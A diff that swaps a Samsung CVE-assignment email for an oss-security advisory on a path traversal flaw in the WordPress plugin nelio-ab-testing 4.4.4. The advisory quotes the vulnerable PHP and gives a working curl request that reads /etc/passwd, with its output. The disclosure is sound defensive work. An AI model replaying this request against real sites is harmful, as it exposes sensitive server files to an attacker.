@@ -1,82 +1,118 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/08/14
-Message-ID: <CAG0ev14edKkjOwT=xdu2HtfHgeFK9mBCysZPGYvY+tg0UHceiQ@mail.gmail.com>
-Date: Thu, 8 Sep 2016 13:39:25 +0800
-From: 0xr0ot <0xr0ot.sec@...il.com>
-To: oss-security@...ts.openwall.com, fulldisclosure@...lists.org
-Subject: Fwd: [scr231911] SVE-2016-6248: SystemUI Security issue
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/10/1
+Message-ID: <20160510062831.GA18384@nixu.com>
+Date: Tue, 10 May 2016 09:28:31 +0300
+From: Henri Salo <henri.salo@...u.com>
+To: <oss-security@...ts.openwall.com>
+Subject: WordPress plugin nelio-ab-testing path traversal vulnerability
 Content-Type: text/plain; charset=utf-8
 
----------- Forwarded message ----------
-From: <cve-request@...re.org>
-Date: 2016-09-08 13:34 GMT+08:00
-Subject: Re: [scr231911] SVE-2016-6248: SystemUI Security issue
-To: 0xr0ot.sec@...il.com
-Cc: cve-request@...re.org
-
-
 -----BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hash: SHA1
 
-> The vulnerability exists due to a null pointer dereference on fimg2d
-> driver. The patch verifies if the object is null before dereferencing
-> it.
->
-> ------------------------------------------
->
-> [VulnerabilityType Other]
-> Null Pointer Dereference
->
-> ------------------------------------------
->
-> [Affected Product Code Base]
-> Samsung Mobile - L(5.0/5.1), M(6.0) devices with Exynos7420 chipset
->
-> ------------------------------------------
->
-> [Affected Component]
-> SystemUI Security issue,L(5.0/5.1), M(6.0) devices with Exynos7420
-> chipset
->
-> ------------------------------------------
->
-> [Attack Type]
-> Local
->
-> ------------------------------------------
->
-> [Impact Denial of Service]
-> true
->
-> ------------------------------------------
->
-> [Reference]
-> http://security.samsungmobile.com/smrupdate.html#SMR-SEP-2016
->
-> SVE-2016-6248: SystemUI Security issue
+Product: WordPress plugin nelio-ab-testing (Nelio AB Testing)
+Product URL:
+    https://wordpress.org/plugins/nelio-ab-testing/
+    https://nelioabtesting.com/
+Vendor: Nelio Software
+    http://neliosoftware.com/
+    https://profiles.wordpress.org/nelio/
 
-Use CVE-2016-7160.
+Vulnerability type: Improper Limitation of a Pathname to a Restricted Directory
+CWE: https://cwe.mitre.org/data/definitions/22.html
+OVE: OVE-20160509-0045
+Vulnerable versions: 4.4.4
+Fixed version: 4.5.0
+Vendor notification: 2016-03-27
+Solution date: 2016-04-08
+Public disclosure: 2016-05-10
 
-- --
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
+Description of the plugin (from WordPress Plugin Directory):
+
+A/B Testing, conversion rate optimization, and beautiful Heatmaps specifically
+designed for WordPress.
+
+Vulnerability details:
+
+The software uses external input to construct a pathname that is intended to
+identify a file that is located underneath a restricted parent directory, but
+the software does not properly neutralize special elements within the pathname
+that causes the pathname to resolve to a location that is outside of the
+intended directory.
+
+Risk:
+
+The attacker is able to read the contents of files and expose sensitive data. If
+the targeted file is used for a security mechanism, then the attacker is able to
+bypass that mechanism.
+
+Affected code:
+
+./nelio-ab-testing/includes/admin/admin-controller.php
+527                 public function generate_html_content() {
+528                         if ( isset( $_POST['filename'] ) && isset( $_POST['classname'] ) ) {
+529                                 $file  = $_POST['filename'];
+530                                 $class = $_POST['classname'];
+531                                 require_once( $file );
+532                                 call_user_func( array ( $class, 'generate_html_content' ) );
+533                         }
+534                 }
+
+Notes:
+
+Authentication required.
+
+Steps to reproduce:
+
+curl -i -s -k  -X 'POST' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; \
+rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.7.1' -H 'Content-Type: \
+application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: \
+XMLHttpRequest' -b '' --data-binary \
+$'action=nelioab_get_html_content&filename=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&classname=NelioABExperimentsPageController' \
+'http://wordpress.example.org/wp-admin/admin-ajax.php'
+HTTP/1.1 200 OK
+Date: Thu, 24 Mar 2016 17:39:06 GMT
+Server: Apache/2.4.10 (Debian)
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+Pragma: no-cache
+X-Frame-Options: SAMEORIGIN
+Vary: Accept-Encoding
+Content-Length: 1358
+Content-Type: text/html; charset=UTF-8
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+
+Timeline:
+2016-03-27: Reported to vendor.
+2016-04-08: Vendor fixes the issue.
+2016-05-10: Public disclosure.
+
+- -- 
+Henri Salo
+Security Specialist, Nixu Oyj
+Mobile: +358 40 770 5733
+PL 39 FIN (Keilaranta 15)
+FIN-02151 Espoo, Finland
 -----BEGIN PGP SIGNATURE-----
 Version: GnuPG v1
 
-iQIcBAEBCAAGBQJX0PgNAAoJEHb/MwWLVhi2paUP/0v/GUG5AWUFg6tUgN7g1i0O
-uRypo3e1aM9OHq3BznGaqBKWUNcbOI8wqcddvQ/9OBNSGxWP393CzxA1qv49HdTd
-q2Uz/5en+sapcNQLG397HCDqaYEo5XskPkMHhro/mhjKHrHPgXkLRjGZirjmOAdS
-0BWAF75iLZKPG6MCIGFMdu5pGYSkGHPGVQ0gSDGaxRxQG77ZmdmfXRkHktGI0+LG
-qL08nISmUddbvr/EhQyHo8mx+v1M2Bo0htOv/Xc2W4JUPKqopYJQpLjJ14eZwxbK
-qPFPr+5nFJH/Vqv6DX19sxsczcykIch5RG7JiwZ4Zchm1RqPFEn14FWVeRW0RBv/
-crl3+QYo3bEzBK8UNulLYhopJ3yHzoASbsbOuCSzIRshMdbV8sXadWfIZQajGNyp
-4bCwcCZ3xdeGilrbXq2Q9ANvYFdmpO5Sp9FLSx6JpCOBfyO+fn812n/y8OskNLBl
-3P0A570RcxcUUDMbeJj39jFj2M1aJTC4RzyjSKFnu8sjtUyhRwXMHUsstp76Y4VS
-OdauchtnREtY3F7FxIXbP2ROZLKVdWvc/08QW2NoY/j/eLJChu1J3NNrHgTOgAI2
-zRBV/kPt50oV06VJADf+Tw4jEdAAZFmgN5ZroWrGiYjNIc9eNt0tpuBPL+qhK7KC
-GmNvf2YbCpAd6YInIhVp
-=x9Z8
+iQIcBAEBAgAGBQJXMX+PAAoJEHu3+uinl6pabd8QAKZPkdJswdtXgKthn6ndgwxW
+3IXzv6ZRlBC/Sf7CyfwY1H/xIUwBXKEOhukwqJqopQTQiWh4gQRfGPgjqF935d4x
+FXM4MYoiIqDgj5N1cDbsj3E/SuVI4ux4Yn83gVBbjiuxXVNV4a9Dynn64I4BErj3
+gIGOFHtjN7mtrtWoK7NfpF87SeZai5sDtuKrvDmUZMSYHZN+gpAoB+scC/pTyYgR
+skiMThtKSJwqd1vg1mVEb0J/cX1a3QRyy8WvLZXzr7GaYwr7zwLhJ6M13MrCdBRV
+r/3yE1xOVz8jL7NwEDOhuop65OMMeTROjB6AVfBv0LgS3ghUZBCM8IQAGSVkggAH
+ZUswrOYYYXNhdJ+8gcAHNErRn8sNPMJbH1QNRnTCJQv3t6FazutFWQkxkG5B3uvQ
+xKWmR72g3m7TFZcvbzXRRE5Kblb8ouUxUY4GW66nqZkSMlfGpqmU2/GvgRgsZbKp
+x+qeBliqw1/03Xi70csMr8HE/HrGf7apC93kmr3gYb698thkpQY3iDi+vfD6njn4
+weo0NywDvODf8M8smUlSXYY2pYMzqw34Kay/NL0intRjoGpgzjl44C2HxVnAC1tg
+DYolXVSI33DVFfUIu+zTeuu3zndf2nDeyoho8yKuSdxJdeA/plxztfv6Eh/altCW
+xmi6wOcNKaaf5fgnZw/u
+=E1RA
 -----END PGP SIGNATURE-----
-
